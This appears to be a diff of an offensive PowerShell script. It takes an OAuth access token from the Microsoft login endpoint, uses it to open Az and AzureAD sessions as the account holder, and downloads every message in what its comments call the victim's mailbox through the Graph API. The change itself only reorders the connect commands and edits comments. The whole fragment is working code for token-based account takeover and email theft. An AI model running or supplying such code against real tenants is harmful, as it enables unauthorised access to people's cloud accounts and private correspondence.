@@ -63,10 +63,12 @@ $posturi = "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.
 $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri $posturi -Body $body
 
 #You could now use response.access_token for direct access to the API, below shows how to use it with your favorite 
-#Powershell modules. The ARM Access token will work on both APIs. 
+#Powershell modules.
 $jwt = Convert-JWTtoken ($response.access_token) 
+Connect-AzAccount -accesstoken ($response.access_token) -accountid ($jwt.oid)
+Connect-AzureAD -AadAccessToken ($response.access_token) -AccountId ($jwt.oid) -TenantId ($jwt.tid)
 
-#Example to query graph directly for all of the victims email messages. 
+#Example to query the graph api directly for all of the victims email messages. 
 $Uri = 'https://graph.microsoft.com/beta/me/messages'
 $accessToken = ($response.access_token)
 [array]$victimsMails = $null
@@ -81,6 +83,4 @@ While ($mails.'@odata.nextLink'){
     $victimsMails += $mails
 }
 
-Connect-AzAccount -accesstoken ($response.access_token) -accountid ($jwt.oid)
-Connect-AzureAD -AadAccessToken ($response.access_token) -AccountId ($jwt.oid) -TenantId ($jwt.tid)
 
